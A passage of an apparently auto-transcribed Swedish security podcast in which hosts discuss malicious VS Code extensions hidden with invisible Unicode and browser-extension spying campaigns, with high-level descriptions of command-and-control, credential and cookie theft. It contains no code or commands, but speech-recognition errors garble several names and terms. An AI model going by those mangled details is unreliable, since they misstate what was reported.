legit extensions. Har samma logga



`623 00:20:44,520 --> 00:20:46,520`
och allting. Men de innehåller



`624 00:20:46,520 --> 00:20:48,520`
något annat. Det är en strategi de har haft bland



`625 00:20:48,520 --> 00:20:50,520`
annat. Man får inte en JSON-



`626 00:20:50,520 --> 00:20:52,520`
parser.



`627 00:20:52,520 --> 00:20:54,520`
Och det är supersvårt för



`628 00:20:54,520 --> 00:20:56,520`
användarna att se skillnad på de här.



`629 00:20:56,520 --> 00:20:58,520`
Du måste verkligen se på utgivaren



`630 00:20:58,520 --> 00:21:00,520`
vem det är som har gjort den.



`631 00:21:00,520 --> 00:21:02,520`
Och den här innehåller då lite ondska.



`632 00:21:02,520 --> 00:21:04,520`
Den har ju då, eftersom den är en Worm



`633 00:21:04,520 --> 00:21:06,520`
så har den en Wormable aspekt.



`634 00:21:06,520 --> 00:21:08,520`
Det vill säga hitta den då



`635 00:21:08,520 --> 00:21:10,520`
att det finns en annan extension



`636 00:21:10,520 --> 00:21:12,520`
lokalt. Återigen som NPM.



`637 00:21:12,520 --> 00:21:14,520`
Det vill säga finns det någon maintainer



`638 00:21:14,520 --> 00:21:16,520`
som vi har infekterat.



`639 00:21:16,520 --> 00:21:18,520`
Då lägger den till sig själv till det



`640 00:21:18,520 --> 00:21:20,520`
repot och så postar den upp den uppdateringen



`641 00:21:20,520 --> 00:21:22,520`
så att den finns på fler.



`642 00:21:22,520 --> 00:21:24,520`
Dock är ju den här effekten inte alls lika stor som



`643 00:21:24,520 --> 00:21:26,520`
NPM. Det finns ju inte riktigt lika



`644 00:21:26,520 --> 00:21:28,520`
många maintainers



`645 00:21:28,520 --> 00:21:30,520`
av extensions till VS Code



`646 00:21:30,520 --> 00:21:32,520`
än det finns NPM-repon.



`647 00:21:32,520 --> 00:21:34,520`
Men ändå. Så den är nog inte alls



`648 00:21:34,520 --> 00:21:36,520`
lika explosiv. Vi snackar



`649 00:21:36,520 --> 00:21:38,520`
jag kommer inte ihåg exakt siffran men det är



`650 00:21:38,520 --> 00:21:40,520`
25, 30, 40 stycken



`651 00:21:40,520 --> 00:21:42,520`
totalt eller något där. Sen får man ju bara se hur



`652 00:21:42,520 --> 00:21:44,520`
populära de extensions är då. Det drabbar väl



`653 00:21:44,520 --> 00:21:46,520`
andra också. Men lite coolt



`654 00:21:46,520 --> 00:21:48,520`
i alla fall att de har den aspekten.



`655 00:21:48,520 --> 00:21:50,520`
Ordet glass i glassform



`656 00:21:50,520 --> 00:21:52,520`
kommer från att exploit-koden



`657 00:21:52,520 --> 00:21:54,520`
är osynlig.



`658 00:21:54,520 --> 00:21:56,520`
De har använt någon special



`659 00:21:56,520 --> 00:21:58,520`
unicode-character.



`660 00:21:58,520 --> 00:22:00,520`
Så du ser inte koden



`661 00:22:00,520 --> 00:22:02,520`
när du läser den i din



`662 00:22:02,520 --> 00:22:04,520`
läsare.



`663 00:22:04,520 --> 00:22:06,520`
Nu vet inte jag riktigt kontexten



`664 00:22:06,520 --> 00:22:08,520`
men det måste ju vara så att du



`665 00:22:08,520 --> 00:22:10,520`
tar ner extensionen och du letar upp



`666 00:22:10,520 --> 00:22:12,520`
extensionens github-repo eller motsvarande



`667 00:22:12,520 --> 00:22:14,520`
och försöker läsa den och då syns det inte.



`668 00:22:14,520 --> 00:22:16,520`
Det är alltså blanktext.



`669 00:22:16,520 --> 00:22:18,520`
I VS Code.



`670 00:22:18,520 --> 00:22:20,520`
Det måste ju vara beroende av var du läser den.



`671 00:22:20,520 --> 00:22:22,520`
Pass. Det är ju där



`672 00:22:22,520 --> 00:22:24,520`
inte unicoden genereras på rätt sätt.



`673 00:22:24,520 --> 00:22:26,520`
Det är möjligt att det är i VS Code



`674 00:22:26,520 --> 00:22:28,520`
och det vet jag inte.



`675 00:22:28,520 --> 00:22:30,520`
Rolig grej.



`676 00:22:30,520 --> 00:22:32,520`
Invisible unicode-characters



`677 00:22:32,520 --> 00:22:34,520`
that make malicious code literally



`678 00:22:34,520 --> 00:22:36,520`
disappear from code editors.



`679 00:22:36,520 --> 00:22:38,520`
Så det är kanske inte bara en



`680 00:22:38,520 --> 00:22:40,520`
utan det är nog flera.



`681 00:22:40,520 --> 00:22:42,520`
All kod är inte borta



`682 00:22:42,520 --> 00:22:44,520`
utan helt plötsligt så är det 5-6 tomma



`683 00:22:44,520 --> 00:22:46,520`
radar. Och det såg



`684 00:22:46,520 --> 00:22:48,520`
halvnaturligt ut.



`685 00:22:48,520 --> 00:22:50,520`
Det kan vara 5-6 tomma radar där.



`686 00:22:50,520 --> 00:22:52,520`
Och där låg då



`687 00:22:52,520 --> 00:22:54,520`
själva malwaren.



`688 00:22:54,520 --> 00:22:56,520`
Så kombinerar vi det med ett par andra intressanta



`689 00:22:56,520 --> 00:22:58,520`
aspekter om man använder en blockchain



`690 00:22:58,520 --> 00:23:00,520`
baserad C2-infrastruktur.



`691 00:23:00,520 --> 00:23:02,520`
Det vill säga att har du väl lagt ditt kommando



`692 00:23:02,520 --> 00:23:04,520`
på din blockchain, det kostar kanske då en penny



`693 00:23:04,520 --> 00:23:06,520`
att göra det eller någonting för den ska vara med



`694 00:23:06,520 --> 00:23:08,520`
så kommer den ju finnas där for fucking ever



`695 00:23:08,520 --> 00:23:10,520`
för den går ju inte att ta bort.



`696 00:23:10,520 --> 00:23:12,520`
Så det är inte så att någon kan rasera



`697 00:23:12,520 --> 00:23:14,520`
din C2-struktur.



`698 00:23:14,520 --> 00:23:16,520`
Det blir svårt.



`699 00:23:16,520 --> 00:23:18,520`
Det var det dessutom som backup om det nu



`700 00:23:18,520 --> 00:23:20,520`
mot förmånen inte skulle funka



`701 00:23:20,520 --> 00:23:22,520`
din C2-infrastruktur där.



`702 00:23:22,520 --> 00:23:24,520`
Så har de Google Calendar som en backup



`703 00:23:24,520 --> 00:23:26,520`
infrastruktur.



`704 00:23:26,520 --> 00:23:28,520`
En del roliga grejer.



`705 00:23:28,520 --> 00:23:30,520`
De harvestade i exempelvis NPM,



`706 00:23:30,520 --> 00:23:32,520`
Github, Github credentials.



`707 00:23:32,520 --> 00:23:34,520`
De targetade primärt



`708 00:23:34,520 --> 00:23:36,520`
49 olika



`709 00:23:36,520 --> 00:23:38,520`
cryptocurrency wallets. Så det var liksom target



`710 00:23:38,520 --> 00:23:40,520`
egentligen med alltihopa. De försökte hitta



`711 00:23:40,520 --> 00:23:42,520`
hemligheter till de wallets.



`712 00:23:42,520 --> 00:23:44,520`
Det borde vi göra



`713 00:23:44,520 --> 00:23:46,520`
en genomgång någon gång på



`714 00:23:46,520 --> 00:23:48,520`
de här command and control infrastrukturerna



`715 00:23:48,520 --> 00:23:50,520`
för det har funnits många roliga genomgångar.



`716 00:23:50,520 --> 00:23:52,520`
För att avsluta det hela



`717 00:23:52,520 --> 00:23:54,520`
så deployar de en SOX-proxy



`718 00:23:54,520 --> 00:23:56,520`
IRC



`719 00:23:56,520 --> 00:23:58,520`
så att du kan använda den här



`720 00:23:58,520 --> 00:24:00,520`
infekterade maskinen som en SOX-proxy



`721 00:24:00,520 --> 00:24:02,520`
in till Enterprise-miljöer.



`722 00:24:02,520 --> 00:24:04,520`
Om det är alldeles för svårt att tunnla



`723 00:24:04,520 --> 00:24:06,520`
din kommunikation via en SOX-proxy



`724 00:24:06,520 --> 00:24:08,520`
så installerar de även en VNC-server på den



`725 00:24:08,520 --> 00:24:10,520`
så du kan ta över den på desktop-sidan.



`726 00:24:10,520 --> 00:24:12,520`
Det var lite kreativt.



`727 00:24:12,520 --> 00:24:14,520`
Det här var då i



`728 00:24:14,520 --> 00:24:16,520`
oktober. Jag tror första steget



`729 00:24:16,520 --> 00:24:18,520`
var 17 oktober.



`730 00:24:18,520 --> 00:24:20,520`
Sen hände det mer den artonde och kom ytterligare



`731 00:24:20,520 --> 00:24:22,520`
en update den nittonde.



`732 00:24:22,520 --> 00:24:24,520`
Och sen givetvis då



`733 00:24:24,520 --> 00:24:26,520`
GlassWave Returns.



`734 00:24:26,520 --> 00:24:28,520`
Och då var det



`735 00:24:28,520 --> 00:24:30,520`
första gången



`736 00:24:30,520 --> 00:24:32,520`
den sjätte november.



`737 00:24:32,520 --> 00:24:34,520`
Det här är ju det second coming då.



`738 00:24:34,520 --> 00:24:36,520`
GlassWave Returns. New wave strikes



`739 00:24:36,520 --> 00:24:38,520`
as we expose attacker infrastructure.



`740 00:24:38,520 --> 00:24:40,520`
Staging miljön för...



`741 00:24:40,520 --> 00:24:42,520`
Då var det ytterligare



`742 00:24:42,520 --> 00:24:44,520`
ytterligare hur många



`743 00:24:44,520 --> 00:24:46,520`
jag tror det var



`744 00:24:46,520 --> 00:24:48,520`
fyra repon i början på november.



`745 00:24:48,520 --> 00:24:50,520`
Och nu är det då den absolut senaste



`746 00:24:50,520 --> 00:24:52,520`
igår



`747 00:24:52,520 --> 00:24:54,520`
kan det stämma, i föregår



`748 00:24:54,520 --> 00:24:56,520`
den första december.



`749 00:24:56,520 --> 00:24:58,520`
GlassWave again returns



`750 00:24:58,520 --> 00:25:00,520`
on the third wave of malicious VS Code packages.



`751 00:25:00,520 --> 00:25:02,520`
Och nu var det ytterligare



`752 00:25:02,520 --> 00:25:04,520`
24 nya packages bara häromdagen då.



`753 00:25:04,520 --> 00:25:06,520`
Och det är framförallt då



`754 00:25:06,520 --> 00:25:08,520`
Microsofts eget repo för extensions



`755 00:25:08,520 --> 00:25:10,520`
men även det finns något extern



`756 00:25:10,520 --> 00:25:12,520`
OpenVSX. Jag vet inte om det är de som



`757 00:25:12,520 --> 00:25:14,520`
inte får vara med och leka i Microsoft



`758 00:25:14,520 --> 00:25:16,520`
världen eller om det är jag som



`759 00:25:16,520 --> 00:25:18,520`
VS Code utvecklare som hatar Microsoft



`760 00:25:18,520 --> 00:25:20,520`
eller någonting och då inte kan tänka mig att använda Microsofts



`761 00:25:20,520 --> 00:25:22,520`
extension. Men det finns alltså ytterligare extension



`762 00:25:22,520 --> 00:25:24,520`
repo som heter OpenVSX och båda



`763 00:25:24,520 --> 00:25:26,520`
de här har drabbats. Det de tyckte



`764 00:25:26,520 --> 00:25:28,520`
var lite anmärkningsvärt tror jag var att



`765 00:25:28,520 --> 00:25:30,520`
nej det var inte den här det är nästa.



`766 00:25:30,520 --> 00:25:32,520`
Så det hände.



`767 00:25:32,520 --> 00:25:34,520`
Så Visual Studio Code



`768 00:25:34,520 --> 00:25:36,520`
extensions bad



`769 00:25:36,520 --> 00:25:38,520`
i det här läget.



`770 00:25:38,520 --> 00:25:40,520`
Det känns lite småläskigt



`771 00:25:40,520 --> 00:25:42,520`
det här liksom.



`772 00:25:42,520 --> 00:25:44,520`
Det är väldigt...



`773 00:25:44,520 --> 00:25:46,520`
Det är ju väldigt likt en vanlig malware egentligen det här.



`774 00:25:46,520 --> 00:25:48,520`
Det är ju väsenskilt tyckte jag från NPM



`775 00:25:48,520 --> 00:25:50,520`
för den är lite annorlunda men det här är en klassisk



`776 00:25:50,520 --> 00:25:52,520`
malware. Jag tycker det här är ju bara slappt.



`777 00:25:52,520 --> 00:25:54,520`
Alla riktiga



`778 00:25:54,520 --> 00:25:56,520`
nördar skriver väl all sin kod i Vim.



`779 00:25:56,520 --> 00:25:58,520`
Ja, ja, ja. Så ja. En IDE



`780 00:25:58,520 --> 00:26:00,520`
och dessutom extensions det är ju bara fusk.



`781 00:26:00,520 --> 00:26:02,520`
Där var den här podcasten slut.



`782 00:26:02,520 --> 00:26:04,520`
Hur många extensions har du i VS Code Jesper?



`783 00:26:04,520 --> 00:26:06,520`
Många.



`784 00:26:06,520 --> 00:26:08,520`
Alltså jag brukar ju bara skriva katt och så



`785 00:26:08,520 --> 00:26:10,520`
packa till en fil och sen skriva binärkoden



`786 00:26:10,520 --> 00:26:12,520`
rätt och håll.



`787 00:26:12,520 --> 00:26:14,520`
Ja, det är snyggt.



`788 00:26:14,520 --> 00:26:16,520`
Ja.



`789 00:26:16,520 --> 00:26:18,520`
Ja, men vi hade ju nästan en övergång där



`790 00:26:18,520 --> 00:26:20,520`
till nästa då. För det finns mer



`791 00:26:20,520 --> 00:26:22,520`
extensions och grejer.



`792 00:26:22,520 --> 00:26:24,520`
I en nyhet från samma dag



`793 00:26:24,520 --> 00:26:26,520`
första december



`794 00:26:26,520 --> 00:26:28,520`
så har vi 4,3 miljoner



`795 00:26:28,520 --> 00:26:30,520`
browsers infected.



`796 00:26:30,520 --> 00:26:32,520`
Nu är det browser extensions



`797 00:26:32,520 --> 00:26:34,520`
och jag älskar namnet på den här



`798 00:26:34,520 --> 00:26:36,520`
malwarekampanjen.



`799 00:26:36,520 --> 00:26:38,520`
Shady Panda.



`800 00:26:38,520 --> 00:26:40,520`
Det vet man ju.



`801 00:26:40,520 --> 00:26:42,520`
Cannot be trusted.



`802 00:26:42,520 --> 00:26:44,520`
Det visade tydliga tecken på att det var en rysk



`803 00:26:44,520 --> 00:26:46,520`
spelare som låg bakom den.



`804 00:26:46,520 --> 00:26:48,520`
Här är det ganska tydliga tecken på att det är en kinesisk



`805 00:26:48,520 --> 00:26:50,520`
spelare då som heter Shady Panda.



`806 00:26:50,520 --> 00:26:52,520`
Det här är då



`807 00:26:52,520 --> 00:26:54,520`
extensions.



`808 00:26:54,520 --> 00:26:56,520`
Det är inte någon evil takeover



`809 00:26:56,520 --> 00:26:58,520`
utan det här är istället, de bygger



`810 00:26:58,520 --> 00:27:00,520`
extensions på



`811 00:27:00,520 --> 00:27:02,520`
marketplace som gör töntiga



`812 00:27:02,520 --> 00:27:04,520`
grejer och töntiga människor



`813 00:27:04,520 --> 00:27:06,520`
installerar de här och sen så efter en stund



`814 00:27:06,520 --> 00:27:08,520`
så gör de här töntiga produktivitetsverktygen



`815 00:27:08,520 --> 00:27:10,520`
mindre töntiga saker.



`816 00:27:10,520 --> 00:27:12,520`
Det har gått i flera vågor



`817 00:27:12,520 --> 00:27:14,520`
det här.



`818 00:27:14,520 --> 00:27:16,520`
Det började lite



`819 00:27:16,520 --> 00:27:18,520`
man kan säga att det började



`820 00:27:18,520 --> 00:27:20,520`
jag såg ett frö nu. Det började i 2018.



`821 00:27:20,520 --> 00:27:22,520`
Men vi återkommer till det.



`822 00:27:22,520 --> 00:27:24,520`
För det första man såg av det här var under



`823 00:27:24,520 --> 00:27:26,520`
2023. Då skapades



`824 00:27:26,520 --> 00:27:28,520`
145 extensions i Chrome



`825 00:27:28,520 --> 00:27:30,520`
och Edge



`826 00:27:30,520 --> 00:27:32,520`
webstorerna.



`827 00:27:32,520 --> 00:27:34,520`
Med en publisher som hette Nuggets



`828 00:27:34,520 --> 00:27:36,520`
New 15 och



`829 00:27:36,520 --> 00:27:38,520`
Rocket Zang. Två olika



`830 00:27:38,520 --> 00:27:40,520`
publishers då. Det var Wallpaper



`831 00:27:40,520 --> 00:27:42,520`
och Productivity Apps typiskt.



`832 00:27:42,520 --> 00:27:44,520`
Det de här gjorde var lite



`833 00:27:44,520 --> 00:27:46,520`
enklare fall av fraud.



`834 00:27:46,520 --> 00:27:48,520`
Så varje gång du klickade



`835 00:27:48,520 --> 00:27:50,520`
på en länk på Ebay



`836 00:27:50,520 --> 00:27:52,520`
eller Amazon eller Booking.com



`837 00:27:52,520 --> 00:27:54,520`
så injektade de affiliate



`838 00:27:54,520 --> 00:27:56,520`
taggar



`839 00:27:56,520 --> 00:27:58,520`
som gjorde att de fick betalt för det här då.



`840 00:27:58,520 --> 00:28:00,520`
Just det. Och det märker du förmodligen



`841 00:28:00,520 --> 00:28:02,520`
inte. Nej precis. Och så hade de dessutom lite



`842 00:28:02,520 --> 00:28:04,520`
Google Analytics tracking på det här



`843 00:28:04,520 --> 00:28:06,520`
för att monetisera browserdata samtidigt.



`844 00:28:06,520 --> 00:28:08,520`
De ingresserade data



`845 00:28:08,520 --> 00:28:10,520`
här och var bara för att tjäna klassiska



`846 00:28:10,520 --> 00:28:12,520`
marketingpengar liksom.



`847 00:28:12,520 --> 00:28:14,520`
Jag gillar det.



`848 00:28:14,520 --> 00:28:16,520`
Low and slow. Så jävla farligt.



`849 00:28:16,520 --> 00:28:18,520`
Om du inte vill betala för mina plugins



`850 00:28:18,520 --> 00:28:20,520`
då jävlar.



`851 00:28:20,520 --> 00:28:22,520`
Give me money. Så det höll de på med



`852 00:28:22,520 --> 00:28:24,520`
under 2023 då.



`853 00:28:24,520 --> 00:28:26,520`
Och då lärde de sig att Chromes



`854 00:28:26,520 --> 00:28:28,520`
review process fokuserar väldigt mycket



`855 00:28:28,520 --> 00:28:30,520`
på initial submission och



`856 00:28:30,520 --> 00:28:32,520`
om du sedan ändrar någonting så märker de inte det.



`857 00:28:32,520 --> 00:28:34,520`
Så hur kan vi



`858 00:28:34,520 --> 00:28:36,520`
göra något med det här? Ja då



`859 00:28:36,520 --> 00:28:38,520`
evolutionerade de lite. Då gjorde de



`860 00:28:38,520 --> 00:28:40,520`
en search redirection



`861 00:28:40,520 --> 00:28:42,520`
så att när du gjorde en search så



`862 00:28:42,520 --> 00:28:44,520`
redirektade du den till en sajt som heter



`863 00:28:44,520 --> 00:28:46,520`
trovi.com som är känd som



`864 00:28:46,520 --> 00:28:48,520`
browser hijacker. Så att då



`865 00:28:48,520 --> 00:28:50,520`
loggade de alla queries



`866 00:28:50,520 --> 00:28:52,520`
de sålde alla queries



`867 00:28:52,520 --> 00:28:54,520`
som marketingdata givetvis



`868 00:28:54,520 --> 00:28:56,520`
och sedan kan de manipulera



`869 00:28:56,520 --> 00:28:58,520`
sökträffarna mot betalning. Det vill säga



`870 00:28:58,520 --> 00:29:00,520`
det är en alternativ



`871 00:29:00,520 --> 00:29:02,520`
Google modell. En Google i



`872 00:29:02,520 --> 00:29:04,520`
röret. Så du betalar för



`873 00:29:04,520 --> 00:29:06,520`
till Trovi så får de



`874 00:29:06,520 --> 00:29:08,520`
upp dina träffar högt på allt.



`875 00:29:08,520 --> 00:29:10,520`
Lite bättre algoritmer



`876 00:29:10,520 --> 00:29:12,520`
bättre sökresultat.



`877 00:29:12,520 --> 00:29:14,520`
De gjorde också cookie exaltation



`878 00:29:14,520 --> 00:29:16,520`
de snodde



`879 00:29:16,520 --> 00:29:18,520`
alla cookies från alla de här



`880 00:29:18,520 --> 00:29:20,520`
grejerna och så skickade de



`881 00:29:20,520 --> 00:29:22,520`
trackingdata till någon speciell sajt



`882 00:29:22,520 --> 00:29:24,520`
som gjorde att de fick en massa bra betalt.



`883 00:29:24,520 --> 00:29:26,520`
Kanon ju. Ja.



`884 00:29:26,520 --> 00:29:28,520`
Det känns som att de kan göra mycket mer om de har alla cookies.



`885 00:29:28,520 --> 00:29:30,520`
Ja men alltså det



`886 00:29:30,520 --> 00:29:32,520`
jag vet inte om jag sa det i förra podcasten



`887 00:29:32,520 --> 00:29:34,520`
att jag slängt in en pihole som DNS



`888 00:29:34,520 --> 00:29:36,520`
hemma. Hälften av min internet



`889 00:29:36,520 --> 00:29:38,520`
trafik är trackerdata. Helt



`890 00:29:38,520 --> 00:29:40,520`
jävla orimligt du vet.



`891 00:29:40,520 --> 00:29:42,520`
Det ska jag fan göra nu och få en ny



`892 00:29:42,520 --> 00:29:44,520`
firewall på gång. Den ska få lite skills.



`893 00:29:44,520 --> 00:29:46,520`
Fy vad



`894 00:29:46,520 --> 00:29:48,520`
och man får ju en fin dashboard med liksom



`895 00:29:48,520 --> 00:29:50,520`
så du ser ju procentuellt av alla. All the dashboards.



`896 00:29:50,520 --> 00:29:52,520`
Alltså my god.



`897 00:29:52,520 --> 00:29:54,520`
Då tänker man internet.



`898 00:29:54,520 --> 00:29:56,520`
Ja sen gjorde de även



`899 00:29:56,520 --> 00:29:58,520`
search query harvesting



`900 00:29:58,520 --> 00:30:00,520`
det vill säga att varenda



`901 00:30:00,520 --> 00:30:02,520`
tangentbordsnedslag du gjorde



`902 00:30:02,520 --> 00:30:04,520`
i sökboxen



`903 00:30:04,520 --> 00:30:06,520`
räggades. Alltså tecken för tecken.



`904 00:30:06,520 --> 00:30:08,520`
Så det kunde de använda för att se inte bara



`905 00:30:08,520 --> 00:30:10,520`
vad du gjorde utan lite hur du tänkte också.



`906 00:30:10,520 --> 00:30:12,520`
Och det var tydligen också saker du kan sälja



`907 00:30:12,520 --> 00:30:14,520`
till sådana här marketingbolag. Det älskar jag.



`908 00:30:14,520 --> 00:30:16,520`
Intressant modificering.



`909 00:30:16,520 --> 00:30:18,520`
Så att än så länge liksom inte superläskiga grejer



`910 00:30:18,520 --> 00:30:20,520`
utan de spionerar som djävulen på dig



`911 00:30:20,520 --> 00:30:22,520`
och säljer allt. Lite som



`912 00:30:22,520 --> 00:30:24,520`
alla andra gör höll jag på att säga.



`913 00:30:24,520 --> 00:30:26,520`
Gör det utan att du är okej att det.



`914 00:30:26,520 --> 00:30:28,520`
Nu kommer vi tillbaks



`915 00:30:28,520 --> 00:30:30,520`
till början det vill säga 2018-2019.



`916 00:30:30,520 --> 00:30:32,520`
För redan 2018-2019



`917 00:30:32,520 --> 00:30:34,520`
så skapade de fem



`918 00:30:34,520 --> 00:30:36,520`
olika extensions i



`919 00:30:36,520 --> 00:30:38,520`
i



`920 00:30:38,520 --> 00:30:40,520`
det här var nog Chrome va till att börja med.



`921 00:30:40,520 --> 00:30:42,520`
Men de har ju en fem i Edge sen.



`922 00:30:42,520 --> 00:30:44,520`
Som de har liksom



`923 00:30:44,520 --> 00:30:46,520`
tagit hand om hela vägen sen



`924 00:30:46,520 --> 00:30:48,520`
2018-2019 och jag tror att de



`925 00:30:48,520 --> 00:30:50,520`
tryckte på knappen mid-2024.



`926 00:30:50,520 --> 00:30:52,520`
Så alltså i sex



`927 00:30:52,520 --> 00:30:54,520`
år så höll de riktiga



`928 00:30:54,520 --> 00:30:56,520`
extensions igång utan dumheter i.



`929 00:30:56,520 --> 00:30:58,520`
För att skapa sig en



`930 00:30:58,520 --> 00:31:00,520`
installed base. Så de hade över 300 000



`931 00:31:00,520 --> 00:31:02,520`
installerade extensions. Snyggt\!



`932 00:31:02,520 --> 00:31:04,520`
Då gjorde de en uppdatering som



`933 00:31:04,520 --> 00:31:06,520`
gjorde ondska.



`934 00:31:06,520 --> 00:31:08,520`
Och den här malwaren är då



`935 00:31:08,520 --> 00:31:10,520`
en



`936 00:31:10,520 --> 00:31:12,520`
hourly återkommande



`937 00:31:12,520 --> 00:31:14,520`
remote code execution.



`938 00:31:14,520 --> 00:31:16,520`
Det vill säga att den ringer upp



`939 00:31:16,520 --> 00:31:18,520`
till en viss API tror jag.



`940 00:31:18,520 --> 00:31:20,520`
Och hämtar det



`941 00:31:20,520 --> 00:31:22,520`
javascriptet som ligger där.



`942 00:31:22,520 --> 00:31:24,520`
Så det är en command and control plats då.



`943 00:31:24,520 --> 00:31:26,520`
Du lägger upp ditt javascript där och



`944 00:31:26,520 --> 00:31:28,520`
varje timme så hämtar det här programmet upp den



`945 00:31:28,520 --> 00:31:30,520`
och kör javascripten.



`946 00:31:30,520 --> 00:31:32,520`
Vi måste börja jobba med lite roliga grejer nu. Det här är jättekul ju.



`947 00:31:32,520 --> 00:31:34,520`
Så



`948 00:31:34,520 --> 00:31:36,520`
olagligt dock vill jag bara säga.



`949 00:31:36,520 --> 00:31:38,520`
Med hjälp utav den så är det ju



`950 00:31:38,520 --> 00:31:40,520`
complete browser surveillance som de säger.



`951 00:31:40,520 --> 00:31:42,520`
De kollar ju historyn, de kollar ju nu



`952 00:31:42,520 --> 00:31:44,520`
hela skärmen. De kan ju



`953 00:31:44,520 --> 00:31:46,520`
hämta allt. Under förutsättning att du har



`954 00:31:46,520 --> 00:31:48,520`
gett rättigheterna då till extensionen misstänker jag.



`955 00:31:48,520 --> 00:31:50,520`
Ja men det är ju det du gör när du installerar den.



`956 00:31:50,520 --> 00:31:52,520`
Ge mig grej\!



`957 00:31:52,520 --> 00:31:54,520`
Det här krävs för att den ska funka.



`958 00:31:54,520 --> 00:31:56,520`
För att du ska få en fin background.



`959 00:31:56,520 --> 00:31:58,520`
Då måste vi kunna läsa all din history.



`960 00:31:58,520 --> 00:32:00,520`
Så att det är vad den gör.



`961 00:32:00,520 --> 00:32:02,520`
Varje URL som du någonsin



`962 00:32:02,520 --> 00:32:04,520`
har hälsat på. HTTP referers,



`963 00:32:04,520 --> 00:32:06,520`
timestamp och



`964 00:32:06,520 --> 00:32:08,520`
alltihopa. Persistenta



`965 00:32:08,520 --> 00:32:10,520`
UID identifiers från



`966 00:32:10,520 --> 00:32:12,520`
local storage. Svinbra om man glömmer något. Complete browser



`967 00:32:12,520 --> 00:32:14,520`
fingerprints med user agent language, platform screen



`968 00:32:14,520 --> 00:32:16,520`
resolution, timezone. All



`969 00:32:16,520 --> 00:32:18,520`
data krypteras sedan med AS och skjuter upp



`970 00:32:18,520 --> 00:32:20,520`
till backenden.



`971 00:32:20,520 --> 00:32:22,520`
Japp, så det gjorde de. Lite man in the



`972 00:32:22,520 --> 00:32:24,520`
middle grejer på det och allting är bra.



`973 00:32:24,520 --> 00:32:26,520`
Sen det var då framförallt



`974 00:32:26,520 --> 00:32:28,520`
Chrome.



`975 00:32:28,520 --> 00:32:30,520`
Allt är avklarat och undanställat nu.



`976 00:32:30,520 --> 00:32:32,520`
Chrome var desenterat och tagit bort det.



`977 00:32:32,520 --> 00:32:34,520`
Nu kommer vi till den coola då.



`978 00:32:34,520 --> 00:32:36,520`
Det här heter



`979 00:32:36,520 --> 00:32:38,520`
Starlab Technology



`980 00:32:38,520 --> 00:32:40,520`
heter utgivaren och det är Edge.



`981 00:32:40,520 --> 00:32:42,520`
De launchade 5 extensions



`982 00:32:42,520 --> 00:32:44,520`
till Edge storen.



`983 00:32:44,520 --> 00:32:46,520`
Ungefär 2023.



`984 00:32:46,520 --> 00:32:48,520`
De fick över 4 miljoner



`985 00:32:48,520 --> 00:32:50,520`
installbase då.



`986 00:32:50,520 --> 00:32:52,520`
Det är rätt många. Alla som kör Edge med andra ord.



`987 00:32:52,520 --> 00:32:54,520`
Någon gång



`988 00:32:54,520 --> 00:32:56,520`
i då



`989 00:32:56,520 --> 00:32:58,520`
Jag tror deras flagship heter WeTab.



`990 00:32:58,520 --> 00:33:00,520`
Som heter WeTab NewTab



`991 00:33:00,520 --> 00:33:02,520`
Page. Så det är väl någon sån här produktivitet



`992 00:33:02,520 --> 00:33:04,520`
grej. Skapar du en ny tab så gör den massa



`993 00:33:04,520 --> 00:33:06,520`
bra grejer.



`994 00:33:06,520 --> 00:33:08,520`
Den



`995 00:33:08,520 --> 00:33:10,520`
gjorde coola grejer.



`996 00:33:10,520 --> 00:33:12,520`
Den hämtar data



`997 00:33:12,520 --> 00:33:14,520`
som djävulen.



`998 00:33:14,520 --> 00:33:16,520`
Och djävulen hämtar mycket data.



`999 00:33:16,520 --> 00:33:18,520`
Varje url du har varit på.



`1000 00:33:18,520 --> 00:33:20,520`
Alla dina search queries.



`1001 00:33:20,520 --> 00:33:22,520`
Mouse click tracking med pixel level



`1002 00:33:22,520 --> 00:33:24,520`
precision. Alltså xy-koordinater



`1003 00:33:24,520 --> 00:33:26,520`
vad du klickar. Browser fingerprinting.



`1004 00:33:26,520 --> 00:33:28,520`
Page interaction. Det vill säga hur du



`1005 00:33:28,520 --> 00:33:30,520`
scrollar, hur länge du är där.



`1006 00:33:30,520 --> 00:33:32,520`
Local storage, session storage.



`1007 00:33:32,520 --> 00:33:34,520`
Accessar alla cookies.



`1008 00:33:34,520 --> 00:33:36,520`
Och med tanke på att de har 4 miljoner



`1009 00:33:36,520 --> 00:33:38,520`
infektionerade användare då. Så de



`1010 00:33:38,520 --> 00:33:40,520`
fick ganska bra dragning på det här.



`1011 00:33:40,520 --> 00:33:42,520`
Så det take away från det här



`1012 00:33:42,520 --> 00:33:44,520`
var framförallt att



`1013 00:33:44,520 --> 00:33:46,520`
det här är ju inte bra. Men du ska inte



`1014 00:33:46,520 --> 00:33:48,520`
installera massa sån här shit på din



`1015 00:33:48,520 --> 00:33:50,520`
browser om du är säkerhetsmedveten.



`1016 00:33:50,520 --> 00:33:52,520`
Men det de tyckte var mest intressant



`1017 00:33:52,520 --> 00:33:54,520`
var hur tydligt det var att de



`1018 00:33:54,520 --> 00:33:56,520`
blev mer och mer avancerade.



`1019 00:33:56,520 --> 00:33:58,520`
Och att de kunde spela the long game.



`1020 00:33:58,520 --> 00:34:00,520`
De har alltså hållit på i 6-7 år



`1021 00:34:00,520 --> 00:34:02,520`
från start till slut.



`1022 00:34:02,520 --> 00:34:04,520`
The Shady Pandas.



`1023 00:34:04,520 --> 00:34:06,520`
So good



`1024 00:34:06,520 --> 00:34:08,520`
for them.



`1025 00:34:08,520 --> 00:34:10,520`
Kan man ändå säga.



`1026 00:34:10,520 --> 00:34:12,520`
Vi spelade in ett avsnitt



`1027 00:34:12,520 --> 00:34:14,520`
som vi döpte till



`1028 00:34:14,520 --> 00:34:16,520`
Målnet har fallit.



`1029 00:34:16,520 --> 00:34:18,520`
Vi pratade om att



`1030 00:34:18,520 --> 00:34:20,520`
AVS stod och brand och



`1031 00:34:20,520 --> 00:34:22,520`
somierna traskade runt



`1032 00:34:22,520 --> 00:34:24,520`
i



`1033 00:34:24,520 --> 00:34:26,520`
Ashers serverhalla.



`1034 00:34:26,520 --> 00:34:28,520`
Men det var dags för nästa molnad att gå ner.



`1035 00:34:28,520 --> 00:34:30,520`
Ja, vi



`1036 00:34:30,520 --> 00:34:32,520`
pratade ju profetiskt om att vi hade upplevt



`1037 00:34:32,520 --> 00:34:34,520`
att det var



`1038 00:34:34,520 --> 00:34:36,520`
väldigt mycket konstiga problem på



`1039 00:34:36,520 --> 00:34:38,520`
Cloudflare. Cloudflare



`1040 00:34:38,520 --> 00:34:40,520`
hörde oss. De ville dels



